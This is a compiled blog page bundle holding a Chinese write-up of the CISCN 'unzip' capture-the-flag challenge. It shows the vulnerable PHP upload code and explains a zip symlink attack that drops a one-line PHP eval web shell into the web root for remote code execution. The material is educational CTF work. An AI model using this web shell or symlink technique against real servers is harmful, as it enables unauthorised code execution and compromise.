"use strict";(self.webpackChunkreicalg=self.webpackChunkreicalg||[]).push([[883],{3452:(n,s,a)=>{a.r(s),a.d(s,{data:()=>p});const p={key:"v-83363a96",path:"/web/ciscn.html",title:"ciscn初赛刷题",lang:"zh-CN",frontmatter:{date:"2023/5/30 19:57",stick:!0,keyword:"misc,ctfshow",description:"刷题",title:"ciscn初赛刷题",tag:["刷题"],categories:["ciscn初赛","歪比八卜"]},excerpt:"",headers:[{level:3,title:"unzip",slug:"unzip",children:[]}],git:{}}},5699:(n,s,a)=>{a.r(s),a.d(s,{default:()=>j});var p=a(6252);const t=(0,p.uE)('<h3 id="unzip" tabindex="-1"><a class="header-anchor" href="#unzip" aria-hidden="true">#</a> unzip</h3><div class="language-php ext-php line-numbers-mode"><pre class="language-php"><code> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>\n<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token variable">$finfo</span> <span class="token operator">=</span> <span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">finfo_file</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;file&quot;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;tmp_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">&#39;application/zip&#39;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>\n    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;cd /tmp &amp;&amp; unzip -o &#39;</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;file&quot;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;tmp_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span><span class="token punctuation">;</span> \n</span></code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div>',2),o=(0,p._)("p",null,"网站源码如上",-1),e=(0,p.Uk)("大概意思就是"),l={href:"https://blog.csdn.net/weixin_46142761/article/details/121858917",target:"_blank",rel:"noopener noreferrer"},c=(0,p.Uk)("$_FILES"),i=(0,p.Uk)("的理解 上传的临时文件，然后finfo （获取文件类型），之后逻辑是 如果文件类型是zip时，那么就执行unzip 该压缩包到当前目录"),u=(0,p._)("p",null,"这里用到了软连接，简单来说就是zip -y 能够同时压缩该文件夹有关软连接的信息，那么如果该文件夹连接到该网站的根目录下，下次解压相同文件夹名的时候，该文件夹中的文件自然就解压到网站根目录下，那么就能够用该文件马进行一系列rce了",-1),r=(0,p._)("blockquote",null,[(0,p._)("p",null,"首先建立软连接")],-1),g=(0,p._)("p",null,[(0,p._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"image-20230529203732497",originSrc:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292037773.png",data:"aurora"})],-1),k=(0,p._)("p",null,[(0,p._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"image-20230529203805218",originSrc:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292038267.png",data:"aurora"})],-1),m=(0,p.uE)('<blockquote><p>进入到文件夹中然后写一个马</p><p>马的内容是</p><div class="language-php ext-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;1&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div></blockquote>',1),b=(0,p._)("p",null,[(0,p._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"image-20230529203956226",originSrc:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292039403.png",data:"aurora"})],-1),d=(0,p.Uk)("这里用到了zip命令中的-y参数"),h={href:"https://www.cnbugs.com/post-4092.html",target:"_blank",rel:"noopener noreferrer"},_=(0,p.Uk)("zip命令详解"),f=(0,p._)("p",null,"-y 是直接保存符号连接，而非该链接所指向的文件，本参数仅在UNIX之类的系统下有效；",-1),q=(0,p._)("p",null,"-r 是递归处理，将指定目录下的所有文件和子目录一并处理；",-1),z=(0,p._)("p",null,[(0,p._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"image-20230529204737313",originSrc:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292047401.png",data:"aurora"})],-1),v=(0,p._)("blockquote",null,[(0,p._)("p",null,"构建好两个压缩包就可以开始上传了"),(0,p._)("p",null,"先上传feng1.zip再上传feng2.zip 使feng.php解压到网站根目录/var/www/html"),(0,p._)("p",null,"然后就可以愉快rce了")],-1),y=(0,p._)("p",null,[(0,p._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"image-20230529205248147",originSrc:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292052233.png",data:"aurora"})],-1),w={},j=(0,a(3744).Z)(w,[["render",function(n,s){const a=(0,p.up)("ExternalLinkIcon");return(0,p.wg)(),(0,p.iD)(p.HY,null,[t,(0,p._)("blockquote",null,[o,(0,p._)("p",null,[e,(0,p._)("a",l,[c,(0,p.Wm)(a)]),i]),u]),r,g,k,m,b,(0,p._)("blockquote",null,[(0,p._)("p",null,[d,(0,p._)("a",h,[_,(0,p.Wm)(a)])]),f,q]),z,v,y],64)}]])}}]);